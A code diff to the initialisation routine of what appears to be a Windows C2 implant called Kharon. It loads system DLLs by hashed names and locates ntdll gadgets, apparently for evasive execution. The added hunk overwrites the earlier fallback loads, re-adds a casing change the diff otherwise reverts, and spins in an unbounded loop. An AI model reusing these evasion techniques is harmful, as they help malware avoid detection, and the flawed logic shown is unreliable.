@@ -76,9 +76,9 @@ auto DECLFN Kharon::Init(
 ) -> void {
     /* ========= [ init modules and funcs ] ========= */
     this->Mscoree.Handle   = LdrLoad::Module( Hsh::Str<CHAR>( "mscoree.dll" ) );
-    this->Advapi32.Handle  = LdrLoad::Module( Hsh::Str<CHAR>( "this->advapi32.dll" ) );
+    this->Advapi32.Handle  = LdrLoad::Module( Hsh::Str<CHAR>( "advapi32.dll" ) );
     this->Wininet.Handle   = LdrLoad::Module( Hsh::Str<CHAR>( "wininet.dll" ) );
-    this->Oleaut32.Handle  = LdrLoad::Module( Hsh::Str<CHAR>( "Oleaut32.dll" ) );
+    this->Oleaut32.Handle  = LdrLoad::Module( Hsh::Str<CHAR>( "oleaut32.dll" ) );
     this->User32.Handle    = LdrLoad::Module( Hsh::Str<CHAR>( "user32.dll" ) );
     this->Shell32.Handle   = LdrLoad::Module( Hsh::Str<CHAR>( "shell32.dll" ) );
     this->Cryptbase.Handle = LdrLoad::Module( Hsh::Str<CHAR>( "cryptbase.dll" ) );
@@ -90,12 +90,26 @@ auto DECLFN Kharon::Init(
     if ( !this->Mscoree.Handle   ) this->Mscoree.Handle   = Lib->Load( "mscoree.dll" );
     if ( !this->Advapi32.Handle  ) this->Advapi32.Handle  = Lib->Load( "advapi32.dll" );
     if ( !this->Wininet.Handle   ) this->Wininet.Handle   = Lib->Load( "wininet.dll" );
-    if ( !this->Oleaut32.Handle  ) this->Oleaut32.Handle  = Lib->Load( "Oleaut32.dll" );
+    if ( !this->Oleaut32.Handle  ) this->Oleaut32.Handle  = Lib->Load( "oleaut32.dll" );
     if ( !this->User32.Handle    ) this->User32.Handle    = Lib->Load( "user32.dll" );
     if ( !this->Shell32.Handle   ) this->Shell32.Handle   = Lib->Load( "shell32.dll" );
     if ( !this->Cryptbase.Handle ) this->Cryptbase.Handle = Lib->Load( "cryptbase.dll" );
     if ( !this->Ws2_32.Handle    ) this->Ws2_32.Handle    = Lib->Load( "ws2_32.dll" );
     if ( !this->Msvcrt.Handle    ) this->Msvcrt.Handle    = Lib->Load( "msvcrt.dll" );
+
+    this->Mscoree.Handle   = LdrLoad::Module( Hsh::Str<CHAR>( "mscoree.dll" ) );
+    this->Advapi32.Handle  = LdrLoad::Module( Hsh::Str<CHAR>( "advapi32.dll" ) );
+    this->Wininet.Handle   = LdrLoad::Module( Hsh::Str<CHAR>( "wininet.dll" ) );
+    this->Oleaut32.Handle  = LdrLoad::Module( Hsh::Str<CHAR>( "Oleaut32.dll" ) );
+    this->User32.Handle    = LdrLoad::Module( Hsh::Str<CHAR>( "user32.dll" ) );
+    this->Shell32.Handle   = LdrLoad::Module( Hsh::Str<CHAR>( "shell32.dll" ) );
+    this->Cryptbase.Handle = LdrLoad::Module( Hsh::Str<CHAR>( "cryptbase.dll" ) );
+    this->Ws2_32.Handle    = LdrLoad::Module( Hsh::Str<CHAR>( "ws2_32.dll" ) );
+    this->Msvcrt.Handle    = LdrLoad::Module( Hsh::Str<CHAR>( "msvcrt.dll" ) );
+
+    while ( !this->Ws2_32.Handle ) {
+        this->Ws2_32.Handle = LdrLoad::Module( Hsh::Str<CHAR>( "ws2_32.dll" ) );
+    }
 
     RSL_IMP( Mscoree );
     RSL_IMP( Advapi32 );
@@ -236,7 +250,7 @@ auto DECLFN Kharon::Init(
     Mem::Copy( this->Machine.ProcessorName, cProcessorName, ProcBufferSize );
     
     this->Mk->Ctx.NtContinueGadget = ( LdrLoad::_Api( this->Ntdll.Handle, Hsh::Str( "LdrInitializeThunk" ) ) + 19 );
-    this->Mk->Ctx.JmpGadget        = this->Mk->FindGadget( this->Ntdll.Handle, 0x23 );
+    this->Mk->Ctx.JmpGadget        = this->Usf->FindGadget( this->Ntdll.Handle, 0x23 );
 
     this->Sys->Enabled = FALSE;
 
